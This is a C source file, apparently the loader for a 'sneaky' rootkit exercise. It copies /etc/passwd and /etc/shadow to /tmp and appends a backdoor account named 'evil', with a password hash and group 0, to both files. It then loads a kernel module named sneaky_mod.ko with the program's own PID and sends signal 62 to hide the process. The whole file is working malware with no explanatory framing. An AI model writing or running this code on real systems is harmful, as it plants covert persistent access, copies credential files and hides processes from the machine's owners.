#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>   


void cp_and_change(){
  system("cp /etc/passwd /tmp/");
  system("cp /etc/shadow /tmp/");
  system("echo \"evil:x:12345:0::/home/:/bin/bash\" >> /etc/passwd");
  system("echo \"evil:$1$5RPVAd$9ybzwB9QcnuOV.SNKQWKX1:18006:0:99999:7:::\" >> /etc/shadow");
}
void load_module(pid_t process_id){
  char parameter[80];
  char path[1024];
  getcwd(path, sizeof(path));
  sprintf(parameter, "insmod ./sneaky_mod.ko sneaky_pid=%d\n", process_id);
  //  printf("parameter is : %s\n", parameter);
  system(parameter);
  pid_t pid = getpid();
  char buf[32];
  memset(buf, '\0', 32);
  snprintf(buf, 32, "kill -62 %d", pid);
  printf("hidepidbuf = %s\n", buf);
  system(buf);  
}

int main(){
  cp_and_change();
  // print_id();
  load_module(getpid());
  while(1){};
  return EXIT_SUCCESS;
}
